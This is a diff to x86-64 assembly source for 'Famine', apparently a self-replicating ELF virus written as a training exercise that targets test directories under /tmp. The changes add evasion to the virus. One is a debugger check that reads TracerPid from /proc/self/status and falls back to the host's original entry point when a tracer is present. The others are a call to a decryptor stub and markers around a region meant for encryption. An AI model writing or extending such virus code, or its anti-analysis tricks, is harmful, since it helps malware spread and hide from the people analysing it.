@@ -5,8 +5,16 @@ global _start
 
 _start:
 	PUSHAQ
+	call decryptor
 	jmp main
 
+;decryptor:
+;	enter 0, 0
+;	mov rax, 
+;	leave
+;	ret
+
+encryption_start:
 memcpy:
 	enter 0, 0
 	mov rcx, rdx
@@ -773,29 +781,61 @@ process_dir:			;  r12:fd   r13:folder   r9:getends ret    r8:buffer   r10:functi
 	leave
 	ret
 
-check_debugger:
+
+
+check_debug:
 	enter 0, 0
-	mov rax, sys_ptrace
-	mov rdi, 0
+	sub rsp, NAME_SIZE + 8
+	lea rdi, [rel self_status]
+	mov rsi, OPEN_PROC_PERMISSION
+	mov rax, sys_open
 	syscall
+	padding
 	cmp rax, 0
-	jl ret_1_debugger
-	mov rdi, 17
-	mov rsi, 0
-	mov r10, 0
+	mov QWORD[rsp], rax
+	jl ret_0
+	mov rdi, rax
+	lea rsi, [rsp + 8]
+	mov rdx, NAME_SIZE
+	mov rax, sys_read
 	syscall
-	mov rax, 0
-	jmp end_check_debugger
-	ret_1_debugger:
+	padding
+	mov rbx, rax
+	sub rcx, rcx
+	dec rcx
+	while_trac_not_found:
+		inc rcx
+		cmp rcx, rbx
+		je debuged_ret_0
+		mov rdi, QWORD[rsp + 8 + rcx]
+		mov rsi, 0x6950726563617254
+		cmp rdi, rsi
+		jne while_trac_not_found
+	mov rax, rsi
+	sub rax, rsi
+	mov al, BYTE[rsp + 19 + rcx]
+	cmp al, 0x30
+	je debuged_ret_0
+
 	mov rax, 1
-	end_check_debugger:
+	jmp debuged_end
+	debuged_ret_0:
+	mov rax, 0
+	debuged_end:
+	push rax
+	mov rdi, QWORD[rsp + 8]
+	mov rax, sys_close
+	syscall
+	padding
+	pop rax
 	leave
 	ret
 
+
 main:
-	call check_debugger
+	call check_debug
 	cmp rax, 1
-	;je jmp_old_entry
+	je jmp_old_entry
 	lea rdi, [rel proc_dir]
 	lea rsi, [rel check_proc]
 	call process_dir
@@ -837,6 +877,8 @@ dir1:
 	db '/tmp/test/', 0
 dir2:
 	db '/tmp/test2/', 0
+self_status:
+	db '/proc/self/status', 0
 proc_dir:
 	db '/proc/', 0
 proc_name_file:
@@ -846,15 +888,14 @@ proc_ban:
 new_line:
 	db 0x0a, 0
 dot:
-	db ".", 0
+	db '.', 0
 ddot:
-	db "..", 0
+	db '..', 0
 data_name:
-	db ".data", 0
+	db '.data', 0
 bss_name:
-	db ".bss", 0
+	db '.bss', 0
+encryption_end:
 signature:
 	db 'Famine version 1.0 (c)oded by gdelabro', 0
-dqdqw:
-	db 'a'
 end:
